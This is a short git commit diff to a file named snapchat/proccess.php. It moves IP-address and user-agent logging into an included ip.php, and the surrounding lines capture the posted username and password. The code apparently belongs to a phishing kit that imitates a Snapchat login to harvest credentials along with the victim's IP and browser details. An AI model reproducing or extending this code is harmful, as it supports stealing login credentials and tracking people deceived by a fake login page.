e6532f45d13d7213c2ab3a36cd0ba3c0297a233d
nomiss7 <89870042+Decisionbot@users.noreply.github.com>
2022-11-02 16:35:34 +0300

    as

--- snapchat/proccess.php
+++ snapchat/proccess.php
@@ -4,20 +4,7 @@ ini_set('display_errors', '1');
 
 //IP Адресс
 
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-    }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-    }
-else
-    {
-      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-    }
-$useragent = " User-Agent: ";
-$browser = $_SERVER['HTTP_USER_AGENT'];
+include 'ip.php';
 
 $username=$_POST['username'];
 $password=$_POST['password'];
